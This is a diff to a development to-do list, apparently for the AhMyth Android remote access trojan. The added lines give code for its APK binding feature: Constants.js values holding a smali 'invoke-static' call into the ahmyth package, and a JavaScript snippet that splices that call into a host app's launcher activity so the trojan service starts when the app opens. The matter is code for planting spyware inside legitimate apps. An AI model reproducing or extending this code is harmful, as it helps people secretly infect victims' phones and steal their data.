@@ -6,19 +6,36 @@
 #
 - [ ] 02: Merge Client & Server upgrades from [@HiddenPirates](https://github.com/HiddenPirates) and then integrate the Java code responisble for allowing the new hook function to work
 #
-- [ ] 03: Replace the exported `orgAppKey` variable in the `Constants.js` & `AppCtrl` files, with the new hook point variable...
+- [ ] 03: Replace the exported `orgAppKey` variable in the `Constants.js` file, with the new hook point variable...
 ```js
 exports.hookPoint = "return-void";
 ```
-...then replace the exported `serviceSrc` variable in the `Constants.js` & `AppCtrl` files, with the new static hook metbod...
+...then replace the exported `serviceSrc` variable in the `Constants.js` file, with the new static hook metbod...
 ```js
-exports.serviceSrc = '/n/n invoke-static {}, Lahmyth/mine/king/ahmyth/';
+exports.serviceSrc = '\n\n' + 
+'invoke-static {}, Lahmyth/mine/king/ahmyth/';
 ```
-...then replace the exported `serviceStart` variable in the `Constants.js` & `AppCtrl` files.
+...then replace the exported `serviceStart` variable in the `Constants.js` file....
 ```js
 exports.serviceStart = 'MainService;->start()V' +
-'/n/n' +
+'\n\n' +
 'return-void';
+```
+....then replace the the old `onCreate` hook point code, with the new code for the new static hook function.
+```js
+var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart; 
+
+var key = CONSTANTS.hookPoint;
+$appCtrl.Log("Modifiying Launcher Activity...");
+$appCtrl.Log();
+
+var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
+fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+    if (error) {
+        $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
+        $appCtrl.Log();
+        return;
+    }
 ```
 #
 - [x] 04: Figure out how to allow AhMyth to search `smali_classes` directories, 
